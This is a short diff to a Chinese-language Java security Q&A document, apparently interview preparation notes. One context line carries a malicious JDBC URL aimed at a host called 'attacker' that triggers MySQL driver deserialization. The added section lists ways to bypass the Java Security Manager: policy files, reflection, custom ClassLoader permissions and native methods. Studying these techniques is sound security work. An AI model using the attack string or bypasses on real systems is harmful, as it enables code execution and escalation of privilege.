@@ -255,3 +255,11 @@ jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.Server
 如果目标的`RMI`服务暴漏了`Object`参数类型的方法，且该类在白名单中，我们就可以注入Payload进去以绕过检测
 
 另外还一些骚思路，比如想办法改源码，或用`Java Agent`对某些方法`Hook`并更改等
+
+
+
+### 谈谈`Security Manager`的绕过（★★★★）
+
+通过设置参数`java.security.policy`指定`policy`以提权；反射调用`setSecurityManager`修改`Security Manager`以绕过；自定义`ClassLoader`并设置`ProtectionDomain`里面的权限初始化为所有权限以绕过；由于`native`方法不受`Java Security Manager`管控，所以可以调用这些方法绕过
+
+
